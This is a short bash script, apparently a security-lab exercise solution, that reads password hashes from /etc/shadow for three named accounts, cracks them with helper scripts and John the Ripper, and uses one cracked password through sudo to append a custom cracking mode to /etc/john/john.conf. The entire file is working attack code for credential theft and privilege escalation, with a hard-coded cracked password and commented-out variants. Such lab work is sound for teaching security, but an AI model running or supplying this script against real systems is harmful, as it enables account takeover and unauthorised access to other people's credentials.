#!/usr/bin/env bash

# Parse the shadow password file
 while IFS= read -r line; do
	if [ "${line:0:8}" = "sysadmin" ]; then
		sysadmin_hash=$line
	elif [ "${line:0:8}" = "yourboss" ]; then 
		yourboss_hash=$line
	elif [ "${line:0:9}" = "yourbuddy" ]; then
		yourbuddy_hash=$line
	fi
 done < /etc/shadow

# Crack the boss' password
# TODO: replaced yourboss_cracked with actual password for testing
 #./crack_password.py "$yourboss_hash" > temp.txt
 yourboss_cracked="money"
 #$(<temp.txt)
 echo $yourboss_cracked
 
# Get the buddy's password using john
# NOTE: this must all be done using yourboss' account (for elevated privilege)
# Format buddy's password
 ./format_password.py "$yourbuddy_hash" > temp_hash.txt
 yourbuddy_hash=$(<temp_hash.txt)

# Update the john configuration
 echo "$yourboss_cracked" | sudo -Su yourboss bash -c 'echo "
[Incremental:BUDDY_CRACK]
File = \$JOHN/ascii.chr
MinLen = 4
MaxLen = 4
CharCount = 95
" | sudo tee -a /etc/john/john.conf'

# Crack the password
 echo "$yourboss_cracked" | sudo -u yourboss john --incremental:buddy_crack temp_hash.txt > temp.txt
 yourbuddy_cracked=$(<temp.txt)
 echo $yourbuddy_cracked

# echo "$yourboss_cracked" | sudo -u yourboss john --incremental:ascii temp_hash.txt > temp.txt
# echo "a" | sudo -S echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.config
# echo "a" | sudo john --incremental:buddy_crack temp_hash.txt > temp.txt
# echo "$yourboss_cracked" | sudo -u yourboss echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.conf
# echo "$yourboss_cracked" | sudo -u yourboss john --single --incremental:ascii "$yourbuddy_hash" > temp.txt
# echo "$yourboss_cracked" | sudo -u yourboss john --show temp_hash.txt > temp.txt
# echo "a" | sudo -S echo "[Incremental:BUDDY_CRACK\nFile = \$JOHN/ascii.chr\nMinLen = 4\nMaxLen = 4\nCharCount = 95\n" >> /etc/john/john.config
# echo "a" | sudo john --incremental:buddy_crack temp_hash.txt > temp.txt

# Crack the sysadmin's password
 ./crack_password.py "$sysadmin_hash" > temp.txt
 sysadmin_cracked=$(<temp.txt)
 echo $sysadmin_cracked

# Cleanup 
 rm temp.txt
 rm temp_hash.txt
